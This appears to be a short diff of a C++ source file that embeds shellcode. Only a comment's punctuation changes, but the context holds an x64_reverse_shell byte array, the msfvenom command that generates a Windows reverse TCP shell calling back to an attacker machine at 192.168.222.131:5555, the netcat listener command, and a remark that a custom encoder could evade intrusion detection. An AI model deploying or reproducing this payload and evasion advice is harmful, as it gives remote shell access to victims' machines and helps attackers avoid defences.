@@ -57,7 +57,7 @@ public:
 		"\x7f\x30\x17\x84\xb8\xd9\x84\x70";
 
 	// msfvenom - p windows/shell_reverse_tcp LHOST=192.168.222.131 LPORT=5555 -f c -e x64/zutto_dekiru
-	// allow connection on attackers machine 192.168.222.131 open port nc -lvnp 5555
+	// allow connection on attackers machine 192.168.222.131 open port: nc -lvnp 5555
 	// note: this payload exececution is often detected by IDS Network attack protection system (custom encoder would probably bypass it)
 	static constexpr unsigned char x64_reverse_shell[] =
 		"\x49\xba\xc1\x9c\x37\x5f\x0b\xca\x66\x2d\x48\x89\xe2\x4d"
